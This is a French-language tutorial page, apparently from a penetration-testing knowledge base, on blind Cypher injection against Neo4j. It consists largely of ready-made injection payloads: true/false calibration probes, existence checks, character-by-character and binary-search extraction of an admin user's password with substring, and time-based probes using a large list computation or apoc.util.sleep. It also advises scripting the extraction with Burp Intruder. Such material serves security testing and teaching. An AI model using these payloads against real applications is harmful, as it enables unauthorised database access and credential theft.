---
order: 4
title: "Injection Cypher aveugle : inférence booléenne et time-based dans Neo4j"
description: "Récupérer des données via une injection Cypher Neo4j qui ne renvoie aucune ligne, en utilisant des patterns conditionnels et apoc.util.sleep() pour l'inférence booléenne et time-based."
keywords:
  - injection Cypher aveugle
  - inférence booléenne
  - injection time-based
  - apoc.util.sleep
  - extraction aveugle Neo4j
  - MATCH conditionnel
---

# Injection aveugle

Lorsqu'un point d'injection ne renvoie aucune ligne à l'attaquant, les données sont récupérées un bit à la fois en faisant dépendre le comportement de la requête d'une condition et en observant la différence. C'est l'analogue Cypher de l'injection SQL aveugle : la réponse ne porte pas les données, mais elle porte un signal (un résultat modifié, un statut différent ou un délai) qui répond à une question oui/non.

## Inférence booléenne

Faites qu'un pattern matche (hit) ou échoue à matcher (no hit) selon la condition testée. Les deux états observables de l'application (une ligne renvoyée versus aucune, HTTP 200 versus vide, « trouvé » versus « non trouvé ») deviennent l'oracle.

Une sonde vraie et une sonde fausse pour calibrer les deux réponses :

```
' OR 1=1 //
' OR 1=2 //
```

Une fois les deux états distinguables, testez un fait et lisez la réponse à partir de l'état obtenu :

```
' OR EXISTS { MATCH (u:User {name:'admin'}) } //
' OR size([ (a:Admin) | a ]) > 0 //
```

Extrayez une valeur caractère par caractère avec `substring` et une comparaison. Chaque requête confirme un caractère, puis vous passez à la position suivante :

```
' OR substring(head([ (u:User {name:'admin'}) | u.password ]),0,1) = 'a' //
' OR substring(head([ (u:User {name:'admin'}) | u.password ]),0,1) < 'm' //
```

Comparez le substring d'un seul caractère **lexicographiquement** avec `>` et `<` (comparaison de chaînes, pas numérique : `toInteger('a')` renvoie null). Cela pilote une recherche binaire sur le jeu de caractères, réduisant le nombre de requêtes par caractère à une poignée. `size()` sur une compréhension produit des comptes (combien d'utilisateurs, quelle longueur de propriété) qui guident le parcours :

```
' OR size(head([ (u:User {name:'admin'}) | u.password ])) = 12 //
```

## Inférence time-based

Lorsque les deux réponses semblent identiques, faites que la condition contrôle la durée d'exécution de la requête. L'approche portable force un calcul coûteux uniquement sur la branche vraie, de sorte qu'une condition vraie répond de façon mesurablement plus lente :

```
' OR CASE WHEN substring(head([ (u:User {name:'admin'}) | u.password ]),0,1)='a'
     THEN size([ x IN range(1,5000000) | x ]) ELSE 0 END > -1 //
```

`CASE WHEN ... THEN ... ELSE ... END` est le conditionnel de Cypher, et seule la branche vraie construit la liste de cinq millions d'éléments, elle s'exécute donc bien plus lentement que la branche triviale. Cela ne nécessite aucune extension.

Lorsqu'APOC est présent, `apoc.util.sleep()` offre un délai fixe plus propre, mais c'est une **procédure** : elle doit être invoquée avec `CALL` et ne peut pas être renvoyée depuis une expression `CASE`. Encadrez-la avec un `CALL` conditionnel dans une sous-requête pour que seul le cas correspondant dorme :

```
' OR EXISTS { MATCH (u:User {name:'admin'}) WHERE substring(u.password,0,1)='a' CALL apoc.util.sleep(3000) RETURN 1 } //
```

## La piloter

L'extraction aveugle est gourmande en requêtes, scriptez-la donc : une requête par caractère par supposition pour le booléen naïf, bien moins avec la recherche binaire ou le timing. Confirmez d'abord les deux états de référence, maintenez le délai bien au-dessus de la gigue réseau (des secondes, pas des millisecondes) pour les sondes time-based, et répétez les mesures de temps pour filtrer le bruit. Combinez avec les techniques de [Extraction de données](data-extraction.md) pour d'abord énumérer les labels et les clés de propriété, afin que la phase aveugle cible des champs connus au lieu de deviner les noms.

## Outils

- **Burp Intruder** : automatiser l'extraction de caractères booléenne et time-based.
- **cypher-shell** : valider les sondes conditionnelles et à sleep contre la base de données.

## Références

- [APOC : apoc.util.sleep](https://neo4j.com/docs/apoc/current/overview/apoc.util/apoc.util.sleep/)
- [Neo4j : Cypher CASE expression](https://neo4j.com/docs/cypher-manual/current/queries/case/)
- [PayloadsAllTheThings : NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
